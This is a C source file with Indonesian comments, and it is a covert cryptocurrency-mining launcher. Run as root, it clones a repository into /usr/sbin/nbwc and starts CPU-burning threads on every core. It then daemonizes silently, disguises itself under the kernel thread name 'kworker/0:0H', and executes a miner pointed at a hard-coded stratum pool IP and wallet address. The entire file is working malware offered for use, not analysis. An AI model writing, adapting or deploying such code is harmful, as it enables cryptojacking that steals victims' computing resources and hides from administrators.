#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <pwd.h>
#include <grp.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/wait.h>

// Konstanta untuk pengendalian beban CPU
#define WORK_TIME_US 80000 // 80 ms kerja
#define SLEEP_TIME_US 20000 // 20 ms tidur

// Fungsi untuk mensimulasikan beban CPU
void* cpu_load_thread(void* arg) {
    while (1) {
        // Fase kerja
        for (volatile long i = 0; i < 25000000L; i++);
        // Fase tidur
        usleep(SLEEP_TIME_US);
    }
    return NULL;
}

// Fungsi untuk memulai beban CPU multi-core
void start_cpu_load() {
    int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    pthread_t threads[num_cores];
    
    printf("Memulai beban CPU pada %d core...\n", num_cores);
    printf("Target penggunaan CPU per core: %.2f%%\n", 
           (double)WORK_TIME_US / (WORK_TIME_US + SLEEP_TIME_US) * 100.0);
    
    for (int i = 0; i < num_cores; i++) {
        if (pthread_create(&threads[i], NULL, cpu_load_thread, NULL) != 0) {
            perror("Gagal membuat thread");
            exit(1);
        }
    }
    
    // Detach thread agar berjalan di latar belakang
    for (int i = 0; i < num_cores; i++) {
        pthread_detach(threads[i]);
    }
}

int changeown (char *str)
{
    char user[256], *group;
    struct passwd *pwd;
    struct group *grp;

    uid_t uid;
    gid_t gid;

    memset(user, '\0', sizeof(user));
    strncpy(user, str, sizeof(user));

    for (group = user; *group; group++)
        if (*group == ':')
        {
            *group = '\0';
            group++;
            break;
        }

    if (pwd = getpwnam(user)) 
    {

        uid = pwd->pw_uid;
        gid = pwd->pw_gid;
    } else uid = (uid_t) atoi(user);

    if (*group)
        if (grp = getgrnam(group)) gid = grp->gr_gid;
        else gid = (gid_t) atoi(group);

    if (setgid(gid)) {
        perror("Error: Can't set GID");
        return 0;
    }

    if (setuid(uid))
    {
        perror("Error: Can't set UID");
        return 0;
    }

    return 1;
}

char *fullpath(char *cmd)
{
    char *p, *q, *filename;
    struct stat st;

    if (*cmd == '/')
        return cmd;

    filename = (char *) malloc(256);

    if  (*cmd == '.')
        if (getcwd(filename, 255) != NULL)
        {
            strcat(filename, "/");
            strcat(filename, cmd);
            return filename;
        }
        else
            return NULL;

    for (p = q = (char *) getenv("PATH"); q != NULL; p = ++q)
    {
        if (q = (char *) strchr(q, ':'))
            *q = (char) '\0';

        snprintf(filename, 256, "%s/%s", p, cmd);

        if (stat(filename, &st) != -1
                && S_ISREG(st.st_mode)
                && (st.st_mode&S_IXUSR || st.st_mode&S_IXGRP || st.st_mode&S_IXOTH))
            return filename;

        if (q == NULL)
            break;
    }

    free(filename);

    return NULL;

}

int main(int argc,char **argv)
{
    // Konfigurasi tetap
    int enable_cpu_load = 1;
    int runsys = 1;
    char *pidfile = "sys.pid";
    char *fakename = "kworker/0:0H";
    
    char fake[256];
    char *execst;
    FILE *f;
    int null;
    int pidnum;
    char **newargv;
    
    // Pastikan program dijalankan sebagai root
    if (geteuid() != 0) {
        fprintf(stderr, "Program harus dijalankan sebagai root (sudo)\n");
        exit(1);
    }
    
    // Buat direktori /usr/sbin jika belum ada
    mkdir("/usr/sbin", 0755);
    
    // Clone repository nbwc jika belum ada
    struct stat st;
    if (stat("/usr/sbin/nbwc", &st) != 0) {
        if (system("git clone -q https://github.com/xos-mine/nbwc /usr/sbin/nbwc 2>/dev/null") != 0) {
            fprintf(stderr, "Gagal cy\n");
            exit(1);
        }
    }
    
    // Berikan izin eksekusi pada file dx
    if (chmod("/usr/sbin/nbwc/dx", 0755) != 0) {
        perror("Gagal memberikan izin eksekusi");
        exit(1);
    }
    
    // Jalankan beban CPU jika dienable
    if (enable_cpu_load) {
        start_cpu_load();
    }
    
    // Siapkan command untuk dieksekusi
    newargv = (char **) malloc(3 * sizeof(char *));
    newargv[0] = "./dx";
    newargv[1] = "-o stratum+tcp://141.94.223.113:4052 -u 49cg2BTsCdmBfUPsCrDsGmREn2diVYSKUahupm2bay5ZU3gmVTzuwgY7yhQcbYCdEeZXSHsYLZKLWXTR4DNR3xcJS29HszU -k -p x";
    newargv[2] = NULL;
    
    // Ubah direktori kerja ke /usr/sbin/nbwc
    if (chdir("/usr/sbin/nbwc") != 0) {
        perror("Failed exd");
        exit(1);
    }
    
    // Setup fake process name
    memset(fake, ' ', sizeof(fake) - 1);
    fake[sizeof(fake) - 1] = '\0';
    strncpy(fake, fakename, strlen(fakename));
    newargv[0] = fake;
    
    // Dapatkan full path untuk dx
    execst = "/usr/sbin/nbwc/dx";
    
    // Daemonize
    if (runsys) 
    {
        if ((null = open("/dev/null", O_RDWR)) == -1)
        {
            perror("Error: /dev/null");
            return -1;
        }

        switch (fork())
        {
            case -1:
                perror("Error: FORK-1");
                return -1;

            case  0:
                setsid();
                switch (fork())
                {
                    case -1:
                        perror("Error: FORK-2");
                        return -1;

                    case  0:
                        umask(0);
                        close(0);
                        close(1);
                        close(2);
                        dup2(null, 0);
                        dup2(null, 1);
                        dup2(null, 2);
                        break;

                    default:
                        return 0;
                }
                break;
            default:
                return 0;
        }
    }

    waitpid(-1, (int *)0, 0);        
    pidnum = getpid();

    if (pidfile != NULL && (f = fopen(pidfile, "w")) != NULL)
    {
        fprintf(f, "%d\n", pidnum);
        fclose(f);
    }

    fprintf(stderr,"==> Fakename: %s PidNum: %d\n", fakename, pidnum); 
    execv(execst, newargv);
    perror("Couldn't execute");
    return -1;
}
